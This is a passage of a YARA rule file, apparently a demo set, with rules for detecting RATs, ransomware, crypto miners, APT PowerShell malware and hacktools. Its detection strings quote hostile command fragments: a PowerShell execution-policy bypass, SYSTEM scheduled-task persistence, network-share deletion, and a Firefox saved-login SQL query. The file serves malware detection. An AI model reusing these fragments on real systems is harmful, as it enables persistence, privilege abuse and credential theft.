      date = "2019-07-20 15:32:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      nodeepdive = "1"
      tags = "DEMO, OBFUS, SCRIPT, SUSP, T1027, T1086"
      minimum_yara = "2.2.0"
      
   strings:
      $r1 = /p[\^]?o[\^]?w[\^]?e[\^]?r[\^]?s[\^]?h[\^]?e[\^]?l\^l/ ascii wide nocase fullword
      $r2 = /p\^o[\^]?w[\^]?e[\^]?r[\^]?s[\^]?h[\^]?e[\^]?l[\^]?l/ ascii wide nocase fullword
   condition: 
      1 of them
} 

rule SUSP_DOC_LNK_in_ZIP_RID2D5D : DEMO FILE SUSP T1023 T1136 {
   meta:
      description = "Detects suspicious .doc.lnk file in ZIP archive"
      author = "Florian Roth"
      reference = "https://twitter.com/RedDrip7/status/1145877272945025029"
      date = "2019-07-02 10:28:41"
      score = 50
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, SUSP, T1023, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = ".doc.lnk" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x4b50 and 1 of them
} 

rule MAL_AveMaria_RAT_Jul19_RID2E8A : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects AveMaria RAT"
      author = "Florian Roth"
      reference = "https://twitter.com/abuse_ch/status/1145697917161934856"
      date = "2019-07-01 11:18:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $a1 = "operator co_await" fullword ascii
      $s1 = "uohlyatqn" fullword ascii
      $s2 = "index = [%d][%d][%d][%d]" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and all of them
} 

rule SUSP_OfficeDoc_VBA_Base64Decode_RID31DD : DEMO FILE SCRIPT SUSP T1132 T1136 {
   meta:
      description = "Detects suspicious VBA code with Base64 decode functions"
      author = "Florian Roth"
      reference = "https://github.com/cpaton/Scripting/blob/master/VBA/Base64.bas"
      date = "2019-06-21 13:40:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, SCRIPT, SUSP, T1132, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "B64_CHAR_DICT" ascii
      $s2 = "Base64Decode" ascii
      $s3 = "Base64Encode" ascii
   condition: 
      uint16 ( 0 ) == 0xcfd0 and filesize < 60KB and 2 of them
} 

rule SUSP_VBA_FileSystem_Access_RID30A9 : DEMO FILE SCRIPT SUSP T1136 {
   meta:
      description = "Detects suspicious VBA that writes to disk and is activated on document open"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2019-06-21 12:49:21"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, SCRIPT, SUSP, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "\\Common Files\\Microsoft Shared\\" wide
      $s2 = "Scripting.FileSystemObject" ascii
      $a1 = "Document_Open" ascii
      $a2 = "WScript.Shell" ascii
      $a3 = "AutoOpen" fullword ascii
   condition: 
      uint16 ( 0 ) == 0xcfd0 and filesize < 100KB and all of ( $s* ) and 1 of ( $a* )
} 

rule SUSP_XMRIG_Reference_RID2E30 : DEMO EXE FILE SUSP T1136 {
   meta:
      description = "Detects an executable with a suspicious XMRIG crypto miner reference"
      author = "Florian Roth"
      reference = "https://twitter.com/itaitevet/status/1141677424045953024"
      date = "2019-06-20 11:03:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, SUSP, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "\\xmrig\\" ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 1 of them
} 

rule MAL_Ramnit_May19_1_RID2D35 : DEMO EXE FILE MAL {
   meta:
      description = "Detects Ramnit malware"
      author = "Florian Roth"
      reference = "https://www.guardicore.com/2019/05/nansh0u-campaign-hackers-arsenal-grows-stronger/"
      date = "2019-05-31 10:22:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and pe.imphash ( ) == "500cd02578808f964519eb2c85153046"
} 

rule MAL_XMR_Miner_May19_1_RID2E1B : DEMO EXE FILE HIGHVOL MAL T1136 {
   meta:
      description = "Detects Monero Crypto Coin Miner"
      author = "Florian Roth"
      reference = "https://www.guardicore.com/2019/05/nansh0u-campaign-hackers-arsenal-grows-stronger/"
      date = "2019-05-31 11:00:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HIGHVOL, MAL, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $x1 = "donate.ssl.xmrig.com" fullword ascii
      $x2 = "* COMMANDS     'h' hashrate, 'p' pause, 'r' resume" fullword ascii
      $s1 = "[%s] login error code: %d" fullword ascii
      $s2 = "\\\\?\\pipe\\uv\\%p-%lu" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 14000KB and ( pe.imphash ( ) == "25d9618d1e16608cd5d14d8ad6e1f98e" or 1 of ( $x* ) or 2 of them )
} 

rule MAL_Parite_Malware_May19_1_RID3057 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects Parite malware"
      author = "Florian Roth"
      reference = "https://www.guardicore.com/2019/05/nansh0u-campaign-hackers-arsenal-grows-stronger/"
      date = "2019-05-31 12:35:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "taskkill /im cmd.exe /f" fullword ascii
      $s2 = "LOADERX64.dll" fullword ascii
      $x1 = "\\dllhot.exe" fullword ascii
      $x2 = "dllhot.exe --auto --any --forever --keepalive" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 10000KB and ( 1 of ( $x* ) or 2 of them )
} 

rule MAL_Parite_Malware_May19_2_RID3058 : DEMO EXE FILE MAL {
   meta:
      description = "Detects Parite malware based on Imphash"
      author = "Florian Roth"
      reference = "https://www.guardicore.com/2019/05/nansh0u-campaign-hackers-arsenal-grows-stronger/"
      date = "2019-05-31 12:35:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 18000KB and ( pe.imphash ( ) == "b132a2719be01a6ef87d9939d785e19e" or pe.imphash ( ) == "78f4f885323ffee9f8fa011455d0523d" )
} 

rule EXPL_Strings_CVE_POC_May19_1_RID3091 : DEMO EXE EXPLOIT FILE T1136 {
   meta:
      description = "Detects strings used in CVE POC noticed in May 2019"
      author = "Florian Roth"
      reference = "https://www.guardicore.com/2019/05/nansh0u-campaign-hackers-arsenal-grows-stronger/"
      date = "2019-05-31 12:45:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, EXPLOIT, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "\\Debug\\poc_cve_20" ascii
      $x2 = "\\Release\\poc_cve_20" ascii
      $x3 = "alloc fake fail: %x!" fullword ascii
      $x4 = "Allocate fake tagWnd fail!" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 1 of them
} 

rule HKTL_CN_ProcHook_May19_1_RID2F38 : CHINA DEMO EXE FILE HKTL T1086 {
   meta:
      description = "Detects hacktool used by Chinese threat groups"
      author = "Florian Roth"
      reference = "https://www.guardicore.com/2019/05/nansh0u-campaign-hackers-arsenal-grows-stronger/"
      date = "2019-05-31 11:47:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1086"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and pe.imphash ( ) == "343d580dd50ee724746a5c28f752b709"
} 

rule SUSP_PDB_CN_Threat_Actor_May19_1_RID3220 : CHINA DEMO EXE FILE SUSP T1136 {
   meta:
      description = "Detects PDB path user name used by Chinese threat actors"
      author = "Florian Roth"
      reference = "https://www.guardicore.com/2019/05/nansh0u-campaign-hackers-arsenal-grows-stronger/"
      date = "2019-05-31 13:51:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, SUSP, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "C:\\Users\\zcg\\Desktop\\" ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 1 of them
} 

rule MAL_QuasarRAT_May19_1_RID2E1E : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects QuasarRAT malware"
      author = "Florian Roth"
      reference = "https://blog.ensilo.com/uncovering-new-activity-by-apt10"
      date = "2019-05-27 11:00:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Quasar.Common.Messages" ascii fullword
      $x2 = "Client.MimikatzTools" ascii fullword
      $x3 = "Resources.powerkatz_x86.dll" ascii fullword
      $x4 = "Uninstalling... good bye :-(" wide fullword
      $xc1 = { 41 00 64 00 6D 00 69 00 6E 00 00 11 73 00 63 00
               68 00 74 00 61 00 73 00 6B 00 73 00 00 1B 2F 00
               63 00 72 00 65 00 61 00 74 00 65 00 20 00 2F 00
               74 00 6E 00 20 00 22 00 00 27 22 00 20 00 2F 00
               73 } 
      $xc2 = { 00 70 00 69 00 6E 00 67 00 20 00 2D 00 6E 00 20
               00 31 00 30 00 20 00 6C 00 6F 00 63 00 61 00 6C
               00 68 00 6F 00 73 00 74 00 20 00 3E 00 20 00 6E
               00 75 00 6C 00 0D 00 0A 00 64 00 65 00 6C 00 20
               00 2F 00 61 00 20 00 2F 00 71 00 20 00 2F 00 66
               00 20 00 } 
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 10000KB and 1 of them
} 

rule HKTL_LNX_Pnscan_RID2C57 : DEMO HKTL LINUX T1046 T1136 {
   meta:
      description = "Detects Pnscan port scanner"
      author = "Florian Roth"
      reference = "https://github.com/ptrrkssn/pnscan"
      date = "2019-05-27 09:45:01"
      score = 55
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, LINUX, T1046, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "-R<hex list>   Hex coded response string to look for." fullword ascii
      $x2 = "This program implements a multithreaded TCP port scanner." ascii wide
   condition: 
      filesize < 6000KB and 1 of them
} 

rule APT_ATP28_Sofacy_Indicators_May19_1_RID3357 : APT DEMO EXE FILE G0007 RUSSIA T1136 {
   meta:
      description = "Detects APT28 Sofacy indicators in samples"
      author = "Florian Roth"
      reference = "https://twitter.com/cyb3rops/status/1129647994603790338"
      date = "2019-05-18 14:43:41"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0007, RUSSIA, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $x1 = "c:\\Users\\user\\Desktop\\openssl-1.0.1e_m\\/ssl/cert.pem" ascii
      $x2 = "C:\\Users\\User\\Desktop\\Downloader_Poco" ascii
      $s1 = "w%SystemRoot%\\System32\\npmproxy.dll" fullword wide
      $op0 = { e8 41 37 f6 ff 48 2b e0 e8 99 ff ff ff 48 8b d0 } 
      $op1 = { e9 34 3c e3 ff cc cc cc cc 48 8d 8a 20 } 
      $op2 = { e8 af bb ef ff b8 ff ff ff ff e9 f4 01 00 00 8b } 
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 10000KB and ( pe.imphash ( ) == "f4e1c3aaec90d5dfa23c04da75ac9501" or 1 of ( $x* ) or ( $s1 and 2 of ( $op* ) ) )
} 

rule MAL_RANSOM_RobinHood_May19_1_RID307D : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects RobinHood Ransomware"
      author = "Florian Roth"
      reference = "https://twitter.com/BThurstonCPTECH/status/1128489465327030277"
      date = "2019-05-15 12:42:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = ".enc_robbinhood" ascii
      $s2 = "c:\\windows\\temp\\pub.key" ascii fullword
      $s3 = "cmd.exe /c net use * /DELETE /Y" ascii
      $s4 = "sc.exe stop SQLAgent$SQLEXPRESS" nocase
      $s5 = "main.EnableShadowFucks" nocase
      $s6 = "main.EnableRecoveryFCK" nocase
      $s7 = "main.EnableLogLaunders" nocase
      $s8 = "main.EnableServiceFuck" nocase
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 8000KB and 1 of them
} 

rule SUSP_Base64_Encoded_Hex_Encoded_Code_RID3420 : DEMO SUSP T1132 T1136 {
   meta:
      description = "Detects hex encoded code that has been base64 encoded"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2019-04-29 15:17:11"
      score = 65
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      nodeepdive = "1"
      
      type = "file"
      tags = "DEMO, SUSP, T1132, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = { 78 34 4e ?? ?? 63 65 44 ?? ?? 58 48 67 } 
      $x2 = { 63 45 44 ?? ?? 58 48 67 ?? ?? ?? 78 34 4e } 
      $fp1 = "Microsoft Azure Code Signp$" 
   condition: 
      1 of ( $x* ) and not 1 of ( $fp* )
} 

rule APT_NK_BabyShark_KimJoingRAT_Apr19_1_RID339E : APT DEMO EXE FILE NK T1136 {
   meta:
      description = "Detects BabyShark KimJongRAT"
      author = "Florian Roth"
      reference = "https://unit42.paloaltonetworks.com/babyshark-malware-part-two-attacks-continue-using-kimjongrat-and-pcrat/"
      date = "2019-04-27 14:55:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, NK, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "%s\\Microsoft\\ttmp.log" fullword wide
      $a1 = "logins.json" fullword ascii
      $s1 = "https://www.google.com/accounts/servicelogin" fullword ascii
      $s2 = "https://login.yahoo.com/config/login" fullword ascii
      $s3 = "SELECT id, hostname, httpRealm, formSubmitURL, usernameField, passwordField, encryptedUsername, encryptedPassword FROM moz_login" ascii
      $s4 = "\\mozsqlite3.dll" fullword ascii
      $s5 = "SMTP Password" fullword ascii
      $s6 = "Yandex\\YandexBrowser\\User Data\\Default\\Login Data" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and ( 1 of ( $x* ) or ( $a1 and 3 of ( $s* ) ) )
} 

rule APT_DNSpionage_Karkoff_Malware_Apr19_1_RID34E4 : APT DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects DNSpionage Karkoff malware"
      author = "Florian Roth"
      reference = "https://blog.talosintelligence.com/2019/04/dnspionage-brings-out-karkoff.html"
      date = "2019-04-24 15:49:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Karkoff.exe" fullword wide
      $x2 = "kuternull.com" fullword wide
      $x3 = "rimrun.com" fullword wide
      $s1 = "C:\\Windows\\Temp\\" wide
      $s2 = "CMD.exe" fullword wide
      $s3 = "get_ProcessExtensionDataNames" fullword ascii
      $s4 = "get_ProcessDictionaryKeys" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and ( 1 of ( $x* ) or all of ( $s* ) )
} 

rule SUSP_DropperBackdoor_Keywords_RID3273 : DEMO EXE FILE SUSP T1136 {
   meta:
      description = "Detects suspicious keywords that indicate a backdoor"
      author = "Florian Roth"
      reference = "https://blog.talosintelligence.com/2019/04/dnspionage-brings-out-karkoff.html"
      date = "2019-04-24 14:05:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, SUSP, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x4 = "DropperBackdoor" fullword wide ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 1 of them
} 

rule SUSP_Netsh_PortProxy_Command_RID3201 : DEMO SUSP T1016 T1090 T1136 {
   meta:
      description = "Detects a suspicious command line with netsh and the portproxy command"
      author = "Florian Roth"
      reference = "https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-interface-portproxy"
      date = "2019-04-20 13:46:41"
      score = 65
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, SUSP, T1016, T1090, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "netsh interface portproxy add v4tov4 listenport=" ascii
   condition: 
      1 of them
} 

rule APT_APT34_PS_Malware_Apr19_1_RID3047 : APT DEMO G0049 G0057 MAL MIDDLE_EAST T1086 T1136 {
   meta:
      description = "Detects APT34 PowerShell malware"
      author = "Florian Roth"
      reference = "https://twitter.com/0xffff0800/status/1118406371165126656"
      date = "2019-04-17 12:33:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, G0049, G0057, MAL, MIDDLE_EAST, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "= get-wmiobject Win32_ComputerSystemProduct  | Select-Object -ExpandProperty UUID" ascii
      $x2 = "Write-Host \"excepton occured!\"" ascii
      $s1 = "Start-Sleep -s 1;" fullword ascii
      $s2 = "Start-Sleep -m 100;" fullword ascii
   condition: 
      1 of ( $x* ) or 2 of them
} 

rule APT_APT34_PS_Malware_Apr19_2_RID3048 : APT DEMO G0049 G0057 MAL MIDDLE_EAST T1086 T1136 {
   meta:
      description = "Detects APT34 PowerShell malware"
      author = "Florian Roth"
      reference = "https://twitter.com/0xffff0800/status/1118406371165126656"
      date = "2019-04-17 12:33:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, G0049, G0057, MAL, MIDDLE_EAST, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "= \"http://\" + [System.Net.Dns]::GetHostAddresses(\"" ascii
      $x2 = "$t = get-wmiobject Win32_ComputerSystemProduct  | Select-Object -ExpandProperty UUID" fullword ascii
      $x3 = "| Where { $_ -notmatch '^\\s+$' }" ascii
      $s1 = "= new-object System.Net.WebProxy($u, $true);" fullword ascii
      $s2 = " -eq \"dom\"){$" ascii
      $s3 = " -eq \"srv\"){$" ascii
      $s4 = "+\"<>\" | Set-Content" ascii
   condition: 
      1 of ( $x* ) and 3 of them
} 

rule APT_APT34_PS_Malware_Apr19_3_RID3049 : APT DEMO G0049 G0057 MAL MIDDLE_EAST T1053 T1086 T1136 {
   meta:
      description = "Detects APT34 PowerShell malware"
      author = "Florian Roth"
      reference = "https://twitter.com/0xffff0800/status/1118406371165126656"
      date = "2019-04-17 12:33:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, G0049, G0057, MAL, MIDDLE_EAST, T1053, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Powershell.exe -exec bypass -file ${global:$address1}" 
      $x2 = "schtasks /create /F /ru SYSTEM /sc minute /mo 10 /tn" 
      $x3 = "\"\\UpdateTasks\\UpdateTaskHosts\"" 
      $x4 = "wscript /b \\`\"${global:$address1" ascii
      $x5 = "::FromBase64String([string]${global:$http_ag}))" ascii
      $x6 = ".run command1, 0, false\" | Out-File " fullword ascii
      $x7 = "\\UpdateTask.vbs" fullword ascii
      $x8 = "hUpdater.ps1" fullword ascii
   condition: 
      1 of them
} 

rule APT_MAL_HOPLIGHT_NK_HiddenCobra_Apr19_1_RID33F3 : APT DEMO G0032 NK T1136 {
   meta:
      description = "Detects HOPLIGHT malware used by HiddenCobra APT group"
      author = "Florian Roth"
      reference = "https://www.us-cert.gov/ncas/analysis-reports/AR19-100A"
      date = "2019-04-13 15:09:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, G0032, NK, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "www.naver.com" fullword ascii
      $s2 = "PolarSSL Test CA0" fullword ascii
   condition: 
      filesize < 1000KB and all of them
} 

rule APT_MAL_HOPLIGHT_NK_HiddenCobra_Apr19_2_RID33F4 : APT DEMO EXE FILE G0032 NK T1050 T1136 {
   meta:
      description = "Detects HOPLIGHT malware used by HiddenCobra APT group"
      author = "Florian Roth"
      reference = "https://www.us-cert.gov/ncas/analysis-reports/AR19-100A"
      date = "2019-04-13 15:09:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0032, NK, T1050, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "%SystemRoot%\\System32\\svchost.exe -k mdnetuse" fullword ascii
      $s2 = "%s\\hid.dll" fullword ascii
      $s3 = "%Systemroot%\\System32\\" fullword ascii
      $s4 = "SYSTEM\\CurrentControlSet\\services\\%s\\Parameters" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 800KB and all of them
} 

rule APT_MAL_HOPLIGHT_NK_HiddenCobra_Apr19_3_RID33F5 : APT DEMO EXE FILE G0032 NK T1136 {
   meta:
      description = "Detects HOPLIGHT malware used by HiddenCobra APT group"
      author = "Florian Roth"
      reference = "https://www.us-cert.gov/ncas/analysis-reports/AR19-100A"
      date = "2019-04-13 15:10:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0032, NK, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Oleaut32.dll" fullword ascii
      $s2 = "Process32NextA" fullword ascii
      $s3 = "Process32FirstA" fullword ascii
      $s4 = "%sRSA key size  : %d bits" fullword ascii
      $s5 = "emailAddress=" fullword ascii
      $s6 = "%scert. version : %d" fullword ascii
      $s7 = "www.naver.com" fullword ascii
      $x1 = "ztretrtireotreotieroptkierert" fullword ascii
      $x2 = "reykfgkodfgkfdskgdfogpdokgsdfpg" fullword ascii
      $x3 = "fjiejffndxklfsdkfjsaadiepwn" fullword ascii
      $x4 = "fgwljusjpdjah" fullword ascii
      $x5 = "udbcgiut.dat" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 800KB and ( 1 of ( $x* ) or 6 of ( $s* ) )
} 

rule MAL_Ransomware_Wadhrama_RID2FED : CRIME DEMO EXE FILE MAL {
   meta:
      description = "Detects Wadhrama Ransomware via Imphash"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2019-04-07 12:18:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CRIME, DEMO, EXE, FILE, MAL"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   condition: 
      uint16 ( 0 ) == 0x5a4d and pe.imphash ( ) == "f86dec4a80961955a89e7ed62046cc0e"
} 

rule SUSP_RAR_with_PDF_Script_Obfuscation_RID34A4 : DEMO FILE OBFUS SUSP T1027 T1136 {
   meta:
      description = "Detects RAR file with suspicious .pdf extension prefix to trick users"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2019-04-06 15:39:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, OBFUS, SUSP, T1027, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = ".pdf.vbe" ascii
      $s2 = ".pdf.vbs" ascii
      $s3 = ".pdf.ps1" ascii
      $s4 = ".pdf.bat" ascii
      $s5 = ".pdf.exe" ascii
   condition: 
      uint32 ( 0 ) == 0x21726152 and 1 of them
} 

rule HKTL_Keyword_InjectDLL_RID2F20 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Detects suspicious InjectDLL keyword found in hacktools or possibly unwanted applications"
      author = "Florian Roth"
      reference = "https://github.com/zerosum0x0/koadic"
      date = "2019-04-04 11:43:51"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "InjectDLL" fullword ascii
      $s4 = "Kernel32.dll" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and all of them
} 

rule SUSP_Just_EICAR_RID2C24 : DEMO FILE SUSP T1136 {
   meta:
      description = "Just an EICAR test file - this is boring stuff"
      author = "Florian Roth"
      reference = "http://2016.eicar.org/85-0-Download.html"
      date = "2019-03-24 09:36:31"
      score = 40
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, SUSP, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x3558 and filesize < 70 and $s1 at 0
} 

rule Ransom_LockerGoga_Mar19_1_RID3037 : DEMO EXE FILE MAL RANSOM T1136 {
   meta:
      description = "Detects LockerGoga ransomware binaries"
      author = "Florian Roth"
      reference = "https://www.nrk.no/norge/skreddersydd-dobbeltangrep-mot-hydro-1.14480202"
      date = "2019-03-19 12:30:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, RANSOM, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "\\.(doc|dot|wbk|docx|dotx|docb|xlm|xlsx|xltx|xlsb|xlw|ppt|pot|pps|pptx|potx|ppsx|sldx|pdf)" wide
      $x2 = "|[A-Za-z]:\\cl.log" wide
      $x4 = "\\crypto-locker\\" ascii
      $xc1 = { 00 43 00 6F 00 6D 00 70 00 61 00 6E 00 79 00 4E
               00 61 00 6D 00 65 00 00 00 00 00 4D 00 6C 00 63
               00 72 00 6F 00 73 00 6F 00 66 00 74 } 
      $xc2 = { 00 2E 00 6C 00 6F 00 63 00 6B 00 65 00 64 00 00
               00 20 46 41 49 4C 45 44 20 00 00 00 00 20 00 00
               00 20 75 6E 6B 6E 6F 77 6E 20 65 78 63 65 70 74
               69 6F 6E } 
      $rn1 = "This may lead to the impossibility of recovery of the certain files." wide
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 4000KB and 1 of ( $x* ) ) or $rn1
} 

rule MAL_CMD_Script_Obfuscated_Feb19_1_RID32B7 : DEMO FILE SCRIPT T1027 T1064 {
   meta:
      description = "Detects obfuscated batch script using env variable sub-strings"
      author = "Florian Roth"
      reference = "https://twitter.com/DbgShell/status/1101076457189793793"
      date = "2019-03-01 14:17:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, SCRIPT, T1027, T1064"
      minimum_yara = "1.7"
      
   strings:
      $h1 = { 40 65 63 68 6F 20 6F 66 66 0D 0A 73 65 74 20 } 
      $s1 = { 2C 31 25 0D 0A 65 63 68 6F 20 25 25 } 
   condition: 
      uint16 ( 0 ) == 0x6540 and filesize < 200KB and $h1 at 0 and uint16 ( filesize - 3 ) == 0x0d25 and uint8 ( filesize - 1 ) == 0x0a and $s1 in ( filesize - 200 .. filesize )
} 

rule HKTL_Dsniff_RID2AFD : APT DEMO HKTL T1136 {
   meta:
      description = "Detects Dsniff hack tool"
      author = "Florian Roth"
      reference = "https://goo.gl/eFoP4A"
      date = "2019-02-19 08:47:21"
      score = 55
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = ".*account.*|.*acct.*|.*domain.*|.*login.*|.*member.*" 
   condition: 
      1 of them
} 

rule APT_WebShell_Tiny_1_RID2DFE : APT DEMO FILE T1100 T1136 WEBSHELL {
   meta:
      description = "Detetcs a tiny webshell involved in the Australian Parliament House network compromise"
      author = "Florian Roth"
      reference = "https://twitter.com/cyb3rops/status/1097423665472376832"
      date = "2019-02-18 10:55:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
